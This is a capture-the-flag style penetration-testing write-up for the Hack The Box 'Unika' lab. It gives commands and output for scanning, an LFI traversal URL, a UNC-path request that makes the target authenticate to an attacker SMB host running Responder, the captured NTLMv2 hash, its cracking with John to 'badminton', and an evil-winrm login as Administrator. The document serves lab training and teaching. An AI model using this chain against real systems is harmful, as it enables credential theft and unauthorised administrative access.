# Capstone – Full System Compromise (HTB: Unika)

## Objective
The objective of this capstone task is to simulate a real-world penetration
testing engagement by performing a complete attack chain — from initial
enumeration to authenticated administrative access — and documenting the
process professionally.

This assessment was performed in a controlled lab environment using the
Hack The Box "Unika" machine.

---

## Environment
- Target: Hack The Box – Unika  
- Target OS: Windows (Apache + PHP + WinRM exposed)  
- Attacker Machine: Kali Linux  
- Network: HTB VPN Lab  
- Tools Used:
  - Nmap  
  - Dirsearch  
  - Responder  
  - John the Ripper  
  - Evil-WinRM  

---

## Attack Chain Overview

1. Enumeration & scanning  
2. Web reconnaissance  
3. Vulnerability identification (LFI, information disclosure)  
4. Exploitation using Responder  
5. NTLM hash capture  
6. Password cracking  
7. Authenticated administrative access  

This represents a realistic red-team style workflow.

---

## Phase 1: Enumeration & Scanning

**Tool Used:** Nmap

```
nmap -A -p- 10.129.15.41
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-19 09:54 -0500
Nmap scan report for unika.htb (10.129.15.41)
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Unika
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Microsoft Windows 10 1909 - 2004 (91%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   170.42 ms 10.10.14.1
2   173.04 ms 10.129.15.41

```
### Result Summary
| Port | Service | Version | Observation |
|------|--------|---------|--------------|
| 80 | HTTP | Apache 2.4.52 | Web app exposed |
| 5985 | WinRM | Microsoft HTTPAPI | Remote access vector |
| 7680 | TCP | Wrapped | Unclear |

OS fingerprinting suggested Windows 10 / Windows Server 2019.

---

## Phase 2: Reconnaissance

### Host Discovery
The web application referenced a domain name: *unika.htb*


This was added to `/etc/hosts`:
```
echo "10.129.15.41 unika.htb" >> /etc/hosts
```

### Directory Discovery

**Tool Used:** dirsearch
```
 dirsearch  -u http://unika.htb

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/joe/HTB/reports/http_unika.htb/_26-01-19_08-29-52.txt

Target: http://unika.htb/

[08:29:52] Starting:                                         
[08:30:44] 200 -    2KB - /cgi-bin/printenv.pl                                                 
[08:31:08] 200 -    3KB - /inc/                                                                              
[08:31:15] 200 -  973B  - /js/   
```

Discovered endpoints included:
- `/cgi-bin/printenv.pl`
- `/inc/`
- `/js/`

The CGI script exposed internal environment variables.

---

## Phase 3: Vulnerability Identification

### Information Disclosure
The endpoint `/cgi-bin/printenv.pl` exposed sensitive environment details such as:
- Server paths  
- Server variables  
- Internal hostnames  
- Backend architecture  

This provided strong context for further exploitation.

---

### Local File Inclusion (LFI)

The application parameter was vulnerable to path traversal:
```
http://unika.htb/index.php?page=../../../../../../windows/system32/drivers/etc/hosts
```


This successfully disclosed the Windows hosts file, confirming LFI vulnerability.

---

### Remote File Inclusion (RFI) Testing

Attempted RFI failed due to: *allow_url_include = 0*


While RFI execution was blocked, the behavior still allowed outbound authentication
attempts — which was later exploited using Responder.

---

## Phase 4: Exploitation – NTLM Hash Capture

**Tool Used:** Responder  

Responder was started on the attacker machine: *responder -I tun0*


A crafted request was used:
```
http://unika.htb/index.php?page=//10.10.15.192/someshare
```

This forced the target to authenticate to the attacker-controlled SMB service.

### Result
Responder successfully captured NTLMv2 hash:
```
page=//10.10.15.192/someshare

on responder we got 
[SMB] NTLMv2-SSP Client   : 10.129.15.41
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:d8c7246615d1248f:092DB77B0AA0D6930F17BDAD9DE09010:010100000000000000D711482B89DC01EFB961AD5FD20C5B0000000002000800580059004400300001001E00570049004E002D0041004C003400570053005100540052004A005100360004003400570049004E002D0041004C003400570053005100540052004A00510036002E0058005900440030002E004C004F00430041004C000300140058005900440030002E004C004F00430041004C000500140058005900440030002E004C004F00430041004C000700080000D711482B89DC010600040002000000080030003000000000000000010000000020000010AD6A9C143DF276E3FCB57E3094B00C9DCA2B3622525BE66ECA1C45F915D28A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100390032000000000000000000   
```

This demonstrates successful credential interception via network protocol abuse.

---

## Phase 5: Credential Cracking

**Tool Used:** John the Ripper  
```
john --wordlist=/usr/share/wordlists/rockyou.txt NTLM 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2026-01-19 10:26) 50.00g/s 204800p/s 204800c/s 204800C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Weak password policy allowed trivial offline password recovery.

---

## Phase 6: Authenticated Remote Access

Port 5985 (WinRM) was identified during enumeration.

Using cracked credentials:
```
evil-winrm -u Administrator -p badminton -i 10.129.15.41
```


Administrative shell access was successfully obtained, confirming **full system
compromise**.

---

## Security Impact

This assessment demonstrates:
- Web application input validation failure (LFI)
- Information disclosure via CGI scripts
- NTLM authentication leakage
- Weak password policy
- Remote administrative access via WinRM
- Complete compromise of the target system
